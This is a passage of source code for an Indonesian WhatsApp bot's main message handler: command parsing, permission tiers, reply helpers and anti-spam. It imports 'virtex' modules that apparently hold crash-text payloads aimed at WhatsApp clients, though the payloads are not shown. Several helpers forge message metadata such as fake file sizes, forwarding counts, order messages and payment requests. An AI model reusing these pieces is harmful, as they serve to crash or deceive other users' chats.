
"use strict";
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require("baileys")
const toMs = require('ms')
const chalk = require('chalk')
const fs = require("fs")
const fse = require('fs-extra');
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn, execSync } = require("child_process")
const axios = require("axios");
const speed = require("performance-now");
const ms = require("parse-ms");
const os = require('os');
const { join,dirname } = require('path');
const path = require('path');
const fetch = require('node-fetch');
const cheerio = require( 'cheerio')

//----------------- LIB FILE ------------------\\
const { getDateId, resetLevelingXp, userXp, userLeveling, getLevelingXp, getLevelingLevel, getLevelingId, addLevelingXp, addLevelingLevel, addUserId } = require("../lib/user");
const { msgFilter, addSpam, SpamExpired, cekSpam} = require('../lib/antispam')
const {bad,thanks,ken,dosa,katamalem,katasiang,katasore,katalopyu,ohayo,devoloper1,teksspam,tekssalah,katara,katabot,katakawai,kataaii,ppTolak,ppLimit,badword} = require('../message/messages')
const {vnToxic,vnMenu,vnSalam,vnAra, vnBot,vnSpam,vnPagi,vnSiang,vnMalam,vnOwner, vnKawai, vnLove} = require('../message/autovn.js')
const { stikOtw,stikSpam,stikAdmin,stikTagOwn,stikBug } = require('../message/autosticker.js')
const { color } = require('../lib/color')
const {listCase,getCase,runtime,FileSize,h2k,isNumber,makeid, isUrl, fetchJson,getBuffer,generateProfilePicture} = require("../lib/myfunc");
const { addblockcmd, deleteblockcmd, checkblockcmd } = require ("../lib/blockcmd");
const { addError,clearAllError, deleteError, checkError } = require("../lib/totalerror")
const { Nothing,Failed,Succes,addAutoClear,autoClearChat, checkDataName, createDataId, addDataId, removeDataId, checkDataId, getHit, cmdAdd, expiredCmd } = require("../lib/totalcmd");
const { cekBannedUser } = require("../lib/banned")

// ====== STORAGE =======//
const thumb = fs.readFileSync('./stik/thumb.jpeg')
global.thumb = thumb
// VIRTEX BY TSUKASA
const { virtex, virtag, philip, emoji1, emoji2, virtex2, virtex3, virtex4, virtex5, virtex8, virtex9, virtex10, virtex11, virtex12, slayer, ngazap, virtexbytsukasa } = require('../virtex/virtex.js')
const { virtex6 } = require('../virtex/virtex6.js')
const { virtex7 } = require('../virtex/virtex7.js')
//----------------- MESSAGE FILE ------------------\\
let { dada } = require("../message/sewabot.js")
const {register} = require("./register.js")
const {settings} = require("./settingsbot.js")
const { Logmessage, Logcommands, Logerror } = require('./logger');

//database
const AntiSpam = db.data.antispam
const DataId = db.data.data
const ban = db.data.banned
const listcmdblock = db.data.blockcmd 
const listerror = db.data.listerror
const hitnya = db.data.hittoday
const dash = db.data.dashboard 
const anonChat = db.data.anonymous 
const allcommand = db.data.allcommand 
const sewa = db.data.sewa
const _toxic =  db.data.toxic 
const spammer = []


//var publik = false
//=======================================//
module.exports = async(hanz, m, chatUpdate, store,quotedMsg) => {
 //  SETTINGS NYA //
settings(m,isNumber)
var publik = db.data.settings['settingbot'].publik
var multi = db.data.settings['settingbot'].multi
var prefa = db.data.settings['settingbot'].prefix
var autoReport = db.data.settings['settingbot'].autoReport
var autoSticker = db.data.settings['settingbot'].autoSticker

var replyType = db.data.settings['settingbot'].replyType
var autoblockcmd = db.data.settings['settingbot'].autoblockcmd
var autoDetectCmd = db.data.settings['settingbot'].autoDetectCmd
var autoRead = db.data.settings['settingbot'].autoRead

var gcOnly = db.data.settings['settingbot'].gcOnly

var Ownerin ="6281260431003@s.whatsapp.net"
var ownerNumber = [`${nomerOwner}@s.whatsapp.net` ,`${hanz.user.jid}`]
const Tnow = (new Date()/1000).toFixed(0)
const seli = Tnow - m.messageTimestamp
if (seli > Intervalmsg) return console.log((`Pesan ${Intervalmsg} detik yang lalu diabaikan agar tidak nyepam`))
try {

// Destructuring properti dari objek m
const { type,args,sender,from,botNumber,senderNumber,groupName,groupId,groupMembers,groupDesc,groupOwner,pushname,itsMe,isGroup,mentionByTag,mentionByReply,users,budy,content,body } = m

// Definisikan prefix yang digunakan
let prefix;
let thePrefix;

if (multi) {
  // Jika multi prefix aktif, gunakan regex untuk mendeteksi prefix
  prefix = /^(!|#|\.|\^|\\|¦)/.test(body) ? body.match(/^(!|#|\.|\^|\\|¦)/gi)[0] : prefa;
  thePrefix = "Multi Prefix";
} else {
  // Jika multi prefix tidak aktif, gunakan prefix default
  prefix = prefa;
  thePrefix = "Single Prefix";
}

// Cek apakah pesan adalah command
const isCmd = body.startsWith(prefix);
const isCommand = isCmd ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : "";

// Gabungkan argumen setelah command
//const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : [];
const q = args.join(' ');
const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const isOwner = ownerNumber.includes(sender) || checkDataId ("owner", sender, DataId)
const command = isOwner? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCommand
const theOwner = sender == Ownerin 
const timestampp = speed();
const latensi = speed() - timestampp
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001) 
const numberQuery = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
const Input = (mentionByTag && mentionByTag[0]) ? mentionByTag[0] : (mentionByReply || q ? numberQuery : false);
const replyCommand = isCmd? isCmd : allcommand.includes(toFirstCase(command))
const selectedButton = (type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : ''
const user = global.db.data.users[m.sender]
const chat = isGroup? global.db.data.chats[m.chat] : false
const kickon = global.db.data.kickon[m.chat]
const botRun = global.db.data.others['runtime']
const botTime = botRun? (new Date - botRun.runtime) :  "Tidak terdeteksi"
const runTime = clockString(botTime)
global.runTime = runTime
//  REGISTER TERLEBIH DAHULU  //
register(m,makeid,isCmd,isOwner,groupName)



// Security / Keamanan
const groupMetadata = isGroup ? await hanz.groupMetadata(m.chat).catch(e => null) : null;
const participants = groupMetadata ? groupMetadata.participants : [];
const groupAdmins = participants.length ? participants.filter(v => v.admin !== null).map(v => v.id) : [];
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupOwner = isGroup ? m.isRAdmin : false
const isGroupAdmins = isGroup ? m.isAdmin : false
const isAntiLink = isGroup ? db.data.chats[from].antilink : false
const isAntilinkGc = isGroup ? db.data.chats[from].antilinkgc : false
const isAntiPromosi = m.isGroup ? db.data.chats[m.chat].antipromosi : false;
const isAntiVideo = m.isGroup ? db.data.chats[m.chat].antivideo : false;
const isAntiSticker = m.isGroup ? db.data.chats[m.chat].antisticker : false;
const isAntiSpam = m.isGroup ? db.data.chats[m.chat].antispam : false; 
const isAntiImage = m.isGroup ? db.data.chats[m.chat].antiimage : false;
  const isAntiBot = m.isGroup ? db.data.chats[m.chat].antibot : false;
  const isAntiAudio = m.isGroup ? db.data.chats[m.chat].antiaudio : false;
 const isKickarea = isGroup ? db.data.chats[from].antiasing : false
const isBanchat = isGroup ? db.data.chats[from].banchat : false
const isAntiNsfw = isGroup ? db.data.chats[from].nsfw : false
const isBanned = sender? cekBannedUser (senderNumber, ban) : false
const isSimi = isGroup ? db.data.chats[from].simi : false
const isGame = isGroup ? db.data.chats[from].game : false
const isPremium = isOwner ? true :  db.data.users[sender].premiumTime !== 0 
const gcount = isPremium ? gcounti.prem : gcounti.user
const userResPanel = JSON.parse(fs.readFileSync("./database/reselerpanel.json"));  
const isResPanel = userResPanel.includes(m.sender.replace('@s.whatsapp.net', ''));
 // ANTI CULIK
 const id = m.isGroup ? m.groupMembers.map((item) => item.id.split("@")[0]) : [];
const anticulik = db.data.settings['anticall']?.anticulik || false; 
if (m.isGroup && anticulik && chat?.expired === 0 && !id.includes(global.nomerOwner)) {
    if (global.session === '.session' || global.session === 'sessions') return;
    try {
        await hanz.sendMessage(m.chat, {
            text: `
Group ini tidak terdaftar di dalam database order bot.
Silakan order terlebih dahulu untuk menggunakan bot ini.

Hubungi owner: wa.me/${global.nomerOwner}
            `,
        });
        await sleep(2000);
        return hanz.groupLeave(m.chat); 
    } catch (error) {
        console.error("Failed to process anticulik logic:", error); 
    }
}   
    
// Ucapan Waktu
let ucapanWaktu;
if (timeWib < "06:00:00") {
    ucapanWaktu = '🌅 Selamat pagi!';
} else if (timeWib < "11:00:00") {
    ucapanWaktu = '☀️ Selamat pagi!';
} else if (timeWib < "15:00:00") {
    ucapanWaktu = '🌞 Selamat siang!';
} else if (timeWib < "18:00:00") {
    ucapanWaktu = '🌇 Selamat sore!';
} else if (timeWib < "19:00:00") {
    ucapanWaktu = '🌙 Selamat malam!';
} else {
    ucapanWaktu = '🌌 Selamat malam!';
}
// Date Islamic
let dot = new Date(new Date + 3600000)
const dateIslamic = Intl.DateTimeFormat("id" + '-TN-u-ca-islamic', {day: 'numeric',month: 'long',year: 'numeric'}).format(dot)

  // Pp ini mah
try {
var ppimg = await hanz.profilePictureUrl(sender, 'image').catch(_ => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60')
} catch (err) {
console.log(err)
}
const its = await getBuffer (ppimg)
// ======= Public & Self And Banchat 
//Public & Self And Banchat
if(!isGroup && gcOnly && !isOwner && !isPremium) {return}
if (!publik && !itsMe && !isOwner && !theOwner) {return}
if (isGroup && !isPremium && !m.isAdmin && isBanchat && !itsMe && !isOwner && !isAntiLink && !isAntilinkGc && !isAntiPromosi && !isAntiVideo && !isAntiSticker && !isAntiSpam && !isAntiImage && !isAntiBot && !isAntiAudio) {return}

/*if (!publik && !itsMe && !isOwner && !theOwner) return 
if (isGroup && isBanchat) {
if (!itsMe && !isOwner) return 
}*/
if(m.myButton) {return}  
// Auto Read Nya
 if (autoRead) {
    hanz.readMessages([m.key]);
}
// Presence Online
if (isCmd){
hanz.sendPresenceUpdate('composing', from)
} else {
hanz.sendPresenceUpdate('available', from)
}
    
 // PICK RANDOM 
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ?  hanz.sendMessage(from, { text: teks, mentions: memberr, contextInfo: { "mentionedJid": memberr }}):  hanz.sendMessage(from, {mentions: memberr,text: teks, contextInfo: { "mentionedJid": memberr }},{quoted: m})
}
const math = (teks) => {
return Math.floor(teks)
}  

//User 
const userLevel = user? db.data.users[m.sender].level : true
const userExp = user? db.data.users[m.sender].exp : true
const userId = user? db.data.users[m.sender].id : true
const amountExp = Math.floor(Math.random() * 10) + 50
const requiredExp = 10000 * userLevel
const userPersen = userExp/requiredExp*100
const userVerified = user? db.data.users[m.sender].date : true

//FAKE REPLY  
require("./alfake.js")(m,pushname,sender,ucapanWaktu,body)

 // FUNCTION SETREPLY 

const setReply = async (result, member) => { 
    const { translate } = require('@vitalets/google-translate-api');

  let senderNya = String(sender || "");

    let language;
    if (senderNya.startsWith("62")) { // Indonesia
        language = "id";
    } else if (senderNya.startsWith("1")) { // Amerika Serikat
        language = "en";
    } else if (senderNya.startsWith("63")) { // Philips
        language = "fil";
    } else if (senderNya.startsWith("81")) { // Jepang
        language = "ja";
    } else if (senderNya.startsWith("49")) { // Jerman
        language = "de";
    } else if (senderNya.startsWith("55")) { // Brasil
        language = "pt"; // Portugis
    } else {
        language = "en"; // Default ke Inggris
    }

   
    let teks;
    if (language === "en") {
        teks = result; 
    } else {
        try {
            const toks = await translate(result, { to: language }); 
            teks = toks.text;
        } catch (err) {
           // console.error("Error during translation:", err);
            teks = result; 
        }
    }

   


  
    const gambar = [
        "https://telegra.ph/file/bccaedbff01a994692111.jpg",
        "https://raw.githubusercontent.com/Renzofficial/Uploade/main/uploader/1736642075253.jpg",
        "https://raw.githubusercontent.com/Renzofficial/Uploade/main/uploader/1736641997912.jpg",
    "https://raw.githubusercontent.com/Rangelofficial/Uploade-db/main/uploader/1735497794395.jpg"
    ];
    const photo = gambar[Math.floor(Math.random() * gambar.length)]; 
let contextInfo = {
mentionedJid: [sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid,
serverMessageId: 100,
newsletterName
 },
externalAdReply:{
showAdAttribution: true, 
title: `Cʏᴀᴀᴀ Bᴏᴛᴢᴢ`,
body:`Runtime ${transformText(runTime)}`,
previewType:"PHOTO",
thumbnailUrl: photo

}
}
  if(replyType === "web"){
  hanz.sendMessage(from, { contextInfo, text: transformText(teks) }, { quoted: m });
  } else if(replyType === "web2"){
  hanz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, mediaType: 3,  renderLargerThumbnail : false,thumbnailUrl: photo,sourceUrl: `https://wa.me/${nomerOwner}?text=Hallo+kak`}}, text: teks},{quoted: m})
  } else if(replyType === "mess"){
  hanz.sendMessage(from, { id: m.key.id, contextInfo: { forwardingScore: 50, isForwarded: true },showAdAttribution: true,text: teks },{quoted: m});
  } else if(replyType === "katalog"){
const { generateWAMessageFromContent } = require("baileys")
let prep = generateWAMessageFromContent(m.chat, { orderMessage: { 
itemCount: 20000, 
status: 50000,
surface: 999,
message: Ehztext(teks),
description: '^^',
orderTitle: 'ʙᴇᴊɪʀ ᴅᴇᴋ',
productId: '8383179131783124',
retailerId: 'ᴛᴏʀʙᴜᴛᴛ ᴀɴɢᴇᴇ',
mediaType: 1,
curreyCode: 'IDR',
id: '746FD84806714E506605D655D52A9427',
totalCurrencyCode: 20.000,
totalAmount1000: '50000',
businessOwnerJid: '6283843107764@s.whatsapp.net',
thumbnail: thumb, 
sourceUrl: `https://wa.me/6281260431003`
}}, {contextInfo: m.mentionJid, quoted: m})
hanz.relayWAMessage(prep)		
  } else if(replyType === "document"){hanz.sendMessage(m.chat, {
	document: fs.readFileSync("./package.json"),
	fileName: '© itsmefathurrzx',
	mimetype: "application/vnd.ms-excel",
	fileLength: 999999999,
	bpageCount: 10903,	
  //jpegThumbnail: fs.readFileSync('./stik/thumbnaildokumen.jpg'),
  caption: Ehztext(teks),
  contextInfo: {
  mentionedJid: [sender],
forwardingScore: 9999999, 
isForwarded: true, 
  externalAdReply: {
	showAdAttribution: false,
	title: botName,
	body: `${ucapanWaktu} kak ${pushname}`,
	thumbnailUrl: photo,
	mediaType: 1,
  sourceUrl: `${web}`,
	}}}, { quoted: m,ephemeralExpiration: 86400});
  } else {
  m.reply('tidak di temukan silahkan periksa lagi')
  }
  }
const reply = (teks) => {
hanz.sendMessage(from, { contextInfo: { forwardingScore: 50, isForwarded: true },showAdAttribution: true,text: teks },{quoted: m})
}
const sendvn = (teks) => {
    hanz.sendMessage(from, {
        audio: { url: teks },
        ptt: true,
        waveform: [0, 0, 50, 0, 0, 0, 10, 80, 10, 60, 10, 99, 60, 30, 10, 0, 0, 0],
        mimetype: 'audio/mpeg',
        forwardedNewsletterMessageInfo: {
            newsletterJid,
            serverMessageId: 100,
            newsletterName
        }
    }, { quoted: m });
};

const sendvn1 = (teks, m) => {
    hanz.sendMessage(from, {
        audio: { url: teks },
        mimetype: 'audio/mpeg',
        ptt: true,
        contextInfo: {
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid,
                serverMessageId: 20,
                newsletterName,
            },
            
        }
    }, { quoted: m });
}

const sendSticker = (teks) => {
hanz.sendMessage(from, {sticker: {url: teks}},{quoted: m})
}
const sendReact = (emoji) => {
hanz.sendMessage(m.chat, { react: { text: emoji, key: m.key } });
}
const sendGif = (teks, teksnya) => {
hanz.sendMessage(from, { video: teks, caption: "Nih!",gifPlayback: true},{quoted: m})
};        
const sendThumb = (url, caption) => {
    let contextInfo = {
        forwardingScore: 99999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid,
            serverMessageId: 100,
            newsletterName
        },
        externalAdReply: {
            showAdAttribution: true,
            renderLargerThumbnail: true,
            title: `${transformText('cyaa botz')}`,
body:`Runtime ${transformText(runTime)}`,
            sourceUrl: web,
            mediaType: 1,
            containsAutoReply: true,
            thumbnailUrl: url
        }
    };
    
 
    hanz.sendMessage(from, { contextInfo, text: caption }, { quoted: m });
};
    
const replyDoc = async(teks) => { 
 hanz.sendMessage(m.chat, {
            document: fs.readFileSync("./package.json"),
           fileName: pushname,
           fileLength: 99999999999999,
            mimetype: 'application/pdf',
     jpegThumbnail:fs.readFileSync("./stik/menhera.jpg"),
            caption: teks,
  contextInfo: {
       showAdAttribution: true,
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: `6283843107764@s.whatsapp.net`
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid,
            serverMessageId:null,
            newsletterName
        }
    }
}, { quoted: m,ephemeralExpiration: 86400});
        }

const sendMusic = (teks) => {
let img = { url : pickRandom(fotoRandom), type : "image/jpeg" }
let url = `https://chat.whatsapp.com/CRqd9QL3qtsFOk4T0fdbjI`

let contextInfo = {
externalAdReply: {
showAdAttribution: false, 
renderLargerThumbnail : false,
title: `⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻`, 
body: `   ━━━━⬤──────────    `,
description: 'Now Playing ....',
mediaType: 2,
thumbnailUrl: img.url,
mediaUrl: url
}
}
	
hanz.sendMessage(from, { contextInfo, mimetype: 'audio/mp4', audio: teks}, { quoted: m })
}

// SendAnti
  const sendAnti = (teks) => {
  let contextInfo = {
  mentionedJid: [sender],
  externalAdReply: {
  forwardingScore: 999,
  isForwarded: true,
  title: transformText(`${m.pushname}`),
  body: transformText(`${week},${calender}`),
  mediaType: 2,
  thumbnail: its,
  mediaUrl: `${syt}`
  }
  }

  hanz.sendMessage(from, { contextInfo, text: `${teks}\n`+readmore+`\n⫹⫺ @${sender.split('@')[0]}\n⫹⫺ ${week} , ${calender}`}, { quoted: m })
  }
  
// SendDaftar
const sendDaftar = async () => {
let jid = sender.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
let tekDftar = transformText(`👤 *Hai:* @${jid.split("@")[0]}
Sepertinya Anda belum terdaftar dalam database anggota kami. Dengan bergabung, Anda akan mendapatkan akses ke fitur eksklusif dan pengalaman terbaik yang kami tawarkan! 💫

📝 *Format Pendaftaran:*
1. Jika ingin mendaftar dengan email:  
   *.daftar email,nama,umur*  
   Contoh: *.daftar example@gmail.com,John,25*

2. Jika tanpa email:  
   *.daftar nama,umur*  
   Contoh: *.daftar John,25*`)
sendReact('❌')
 await sendAnti(tekDftar)
  //reply(tekDftar)
/*let contextInfo = {
        mentionedJid: [sender],
        externalAdReply: {
            showAdAttribution: true,
            renderLargerThumbnail: true,
            title: transformText (`❌ NOT ACCES`),
sourceUrl:'https://wa.me/p/8383179131783124/6285795718659',
            mediaType: 1,
            containsAutoReply: true,
            thumbnailUrl: 'https://raw.githubusercontent.com/Rangelofficial/Uploade-db/main/uploader/1735744864105.jpg'
        }
    };
 await hanz.sendMessage(
        from,
        { contextInfo, text: tekDftar },
        { quoted: m }
    );*/
    }


  
// Reply Edit
    hanz.editmsg = async (e, t) => {
        var a = [`${e}.`, `${e}..`, `${e}...`, `${e}....`, `${t}`];
        let { key: s } = await hanz.sendMessage(m.chat, { text: e });

        for (let r = 0; r < a.length; r++) {
            await hanz.sendMessage(m.chat, { text: a[r], edit: s });
        }
    }

 // ======== FUNCTION SEND VN ========//
//VN saat ada yang toxic
const anying = vnToxic
const astaga = anying[Math.floor(Math.random() * anying.length)]
//Vn Audio Menu
const vnme = vnMenu
const dmusic = vnme[Math.floor(Math.random() * vnme.length)]
//VN saat ada yg bilang bot
const ulul = vnBot
const halo = ulul[Math.floor(Math.random() * ulul.length)]
//VN saat ada yang ucap pagi
const oyo = vnPagi
const pagi = oyo[Math.floor(Math.random() * oyo.length)]
//VN saat ada yang ucap siang
const oyo1 = vnSiang
const siang = oyo1[Math.floor(Math.random() * oyo1.length)]
//VN saat ada yang ucap malam
const oyo2 = vnMalam
const malam = oyo2[Math.floor(Math.random() * oyo2.length)]
//VN saat ada yg akses fitur owner
const ahenggak = vnOwner
const gakmau = ahenggak[Math.floor(Math.random() * ahenggak.length)]
//VN saat ada yg spam
const alal = vnSpam
const nospam = alal[Math.floor(Math.random() * alal.length)]
//VN saat ada yg bilang asalamualaikum
const alul = vnSalam
const walaikumsalam = alul[Math.floor(Math.random() * alul.length)]
//VN saat ada yg bilang i love u
const awlu = vnLove
const lopyoutoo = awlu[Math.floor(Math.random() * awlu.length)]
//VN saat ada yg bilang ara
const ara = vnAra
const wibu = ara[Math.floor(Math.random() * ara.length)]
//VN kawai
const olah = vnKawai
const kawai = olah[Math.floor(Math.random() * olah.length)]
// ======= FUNCTION SEND STICKER =======//
//stik otw
const onde = stikOtw
const otw =
onde[Math.floor(Math.random() * onde.length)]
//stik spam
const spamm = stikSpam
const spamni =
spamm[Math.floor(Math.random() * spamm.length)]
//stik Tag Owner
const TagOwn = stikTagOwn
const TagOwner =
TagOwn[Math.floor(Math.random() * TagOwn.length)]
// ===== RESPON TEKS =====//
//Teks Spam
const JanSpam = teksspam
const Teksspam = JanSpam[Math.floor(Math.random() * JanSpam.length)]


// ======= FUNCTION ONLY? =======//
//ONLY OWNER 
const onlyOwner = async() => {
 let tksOnr = `Maaf ${pushname}, fitur ini hanya tersedia untuk Owner. Terima kasih atas pengertiannya 🙏`;
sendReact('❌')
    replyDoc(tksOnr);
};

 //ONLY ADMIN
const onlyAdmin = async() => {
    let nlyAdmn = `Maaf ${pushname}, 「🤴🏻」ғɪᴛᴜʀ ɪɴɪ ᴋʜᴜsᴜs ᴜɴᴛᴜᴋ ᴀᴅᴍɪɴ. ᴛᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴀᴛᴀs ᴘᴇɴɢᴇʀᴛɪᴀɴɴʏᴀ`;    
    sendReact('❌');
   replyDoc(nlyAdmn);
};

//ONLY BADMIN
const onlyBadmin = async() =>{
let bdmin = `HAI ${pushname} 「🤴」sɪʟᴀʜᴋᴀɴ ᴊᴀᴅɪᴋᴀɴ ʙᴏᴛ ᴀᴅᴍɪɴ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ ᴀɢᴀʀ ʙɪsᴀ ᴍᴇᴍᴀᴋᴀɪ ғɪᴛᴜʀ ɪɴɪ`
sendReact('❌')
replyDoc(bdmin)
}
//ONLY PREMIUM 
const onlyPrem = async() =>{
let onlPrm = Ehztext(`Hallo ${pushname}\n「💎」ғɪᴛᴜʀ ᴋʜᴜsᴜs ᴜsᴇʀ ᴘʀᴇᴍɪᴜᴍ, sɪʟᴀʜᴋᴀɴ ᴋᴇᴛɪᴋ .ʙᴜʏᴘʀᴇᴍ ᴜɴᴛᴜᴋ ʙᴇʟɪ`)
sendReact('❌')
replyDoc(onlPrm)
/*hanz.sendMessage(from, {
  image: { url: 'https://pomf2.lain.la/f/l3ytig31.jpg' }, 
  caption:onlPrm
}, { quoted: m });*/

}
//ONLY LIMIT
const onlyLimit = async() => {
    let tekLmit = Ehztext(`*⚠️ ʟɪᴍɪᴛ ʜᴀʙɪs - ᴀᴋsᴇs ᴅɪʙᴀᴛᴀsɪ*
    ᴍᴀᴀғ, ᴋᴀᴋ @${sender.split('@')[0]}, ʟɪᴍɪᴛ ᴋᴀᴍᴜ sᴜᴅᴀʜ ʜᴀʙɪs. sɪʟᴀᴋᴀɴ ᴄᴇᴋ ʟɪᴍɪᴛ ᴅᴇɴɢᴀɴ ᴘᴇʀɪɴᴛᴀʜ *.ᴄᴇᴋʟɪᴍɪᴛ*, ᴀᴛᴀᴜ ᴋʟᴀɪᴍ ʟɪᴍɪᴛ ʙᴀʀᴜ ᴅᴇɴɢᴀɴ ᴘᴇʀɪɴᴛᴀʜ *.ᴄʟᴀɪᴍ*. 
    ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴇʟɪ ᴛᴀᴍʙᴀʜᴀɴ ʟɪᴍɪᴛ, ɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ *.sʜᴏᴘᴄ* 🛒. ᴛᴇʀɪᴍᴀ ᴋᴀsɪʜ!`);
sendReact('❌')
replyDoc(tekLmit)
    /*hanz.sendMessage(from, {
        image: { url: 'https://pomf2.lain.la/f/vw7dg14q.jpg' }, 
        caption: tekLmit
    }, { quoted: m });*/
};

//ONLY GLIMIT
const onlyGlimit = async() => {
  sendReact('❌')
let teksGl = Ehztext(`*❌ ʟɪᴍɪᴛ - ᴇxᴘɪʀᴇᴅ*
ᴍᴀᴀғ ᴋᴀᴋ @${sender.split('@')[0]} ʟɪᴍɪᴛ ɢᴀᴍᴇ ᴋᴀᴍᴜ sᴜᴅᴀʜ ʜᴀʙɪs! sɪʟᴀᴋᴀɴ ᴄᴇᴋ ʟɪᴍɪᴛ`)
replyDoc(teksGl)
}

//ONLY PRIVATE
const onlyPrivate = async() => {
let tekNya = Ehztext(`ʜᴀɪ ${pushname} ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴋsᴇss ᴅɪ ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛ ʙᴏᴛ`)
sendReact('❌')
replyDoc(tekNya)
}
//ONLY TOKO
const onlyToko = async() => {
let wek = `
👥 *Info*
┌ ◦ Nama: ${pushname}
╰ ◦ Saldo: Rp

🕒 *Tanggal & Waktu* 
┌ ◦ ${week}, ${calender}
╰ ◦ ${dateIslamic}

Selamat datang di toko kami!!
Kami dengan bangga memperkenalkan layanan unggulan kami yang dapat Anda nikmati secara privat.
Nikmati fitur-fitur eksklusif yang hanya dapat diakses melalui percakapan pribadi ini.

Untuk akses lebih lanjut dan berinteraksi dengan komunitas, silakan bergabung dengan grup bot resmi kami di [ *.gcbot* ].

${readmore}
${menuprivate(prefix)}
`
let numb = ["7.76","15.48","8.92","10.72","13.48","4.39","5.99","20.5600"]
let amont = numb[Math.floor(Math.random() * numb.length)]
hanz.relayMessage(m.chat,  {
requestPaymentMessage : {
expiryTimestamp: 0,												
currencyCodeIso4217: 'IDR',
amount1000: (amont) * 1000,
requestFrom: `${m.sender.split('@')[0]}@s.whatsapp.net`,
noteMessage: {
extendedTextMessage: {
text : Ehztext(wek),
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: true,

}
}
}
}
}
}, {})
};
    
async function loading() {
    let emotLoad = ["🕛", "🕒", "💦"]; // 
    let index = 0;
    let intervalId = setInterval(async () => {
        if (index < emotLoad.length) {         
            await hanz.sendMessage(from, { react: { text: emotLoad[index], key: m.key } });
            index++; 
        } else {
            clearInterval(intervalId);
        }
    }, 1000); 
}
// ======== MESSAGE ==========//
require("./listmenu.js")
require("./message.js")(senderNumber, prefix,command,replyDoc)
  //======= CONTOH MEDIA ========//
let colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isViewOnce = (type == 'viewOnceMessageV')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')

const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isReaction = (type == 'reactionMessage')
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')

// ========= SYSTEM EXPIRED ======== //


// ======= CONSOLE LOG ========= //
//Console log
if(!isCmd && !isAllMedia &&!isReaction && budy.length < 8000 && type !== 'protocolMessage') Logmessage(hanz,m,budy,AntiSpam)
if(isCmd) Logcommands(m,command) 
// AUTO READ & REACT SW
    if (m.key.remoteJid == "status@broadcast") return hanz.sendMessage(m.key.remoteJid, { react: { text: '😹', key:  m.key } }, { statusJidList: [m.key.participant, m.sender] }).catch(() => {
        false
        });
    
//Auto Hit
expiredCmd(hitnya, dash)
const thisHit = `${getHit("run", hitnya)}`
global.thisHit = thisHit

if(isCmd){
db.data.users[sender].hit += 1
if(m.isGroup) db.data.chats[m.chat].hit += 1
cmdAdd("run", "1d", hitnya)
Succes(toFirstCase(command), dash, allcommand)
}



//ADD SPAM
const addSpammer = function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
_db[position].spam += 1
 } else {
let bulin = ({ id: jid, spam: 1 })
 _db.push(bulin)     
}
}

const FinisHim = async function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
if(_db[position].spam > 7){
if(db.data.users[sender].banned.status || !isOwner){return}
let obj = {
id: senderNumber,
status: true,
date: calender,
reason: "Spam Bot"
}
db.data.users[woke].banned = obj               
console.log(`${jid} Terdeteksi spam lebih dari ${_db[position].spam} kali`)
setReply("Kamu telah di banned karena telah melakukan spam")
}
} else {
console.log(`Spam ke ${_db[position].spam}`)
}
}
//NEW ANTI SPAM


//ANTI SPAM BERAKHIR
if(SpamExpired(senderNumber, "Case", AntiSpam)){
let position = false
for(let i of spammer){
if(i.id == senderNumber){
position = i
}
}
    
if (position !== false) {
spammer.splice(position, 1)
console.log(chalk.bgGreen(color("[  Remove ]", "black")),"Sukses remove spammer")
}
}

SpamExpired(senderNumber, "NotCase", AntiSpam)
if(isBanned && !isOwner){return} //user terbanned
if(isCmd && cekSpam("Case",senderNumber, AntiSpam)){
addSpammer(senderNumber, spammer)
FinisHim(senderNumber, spammer)
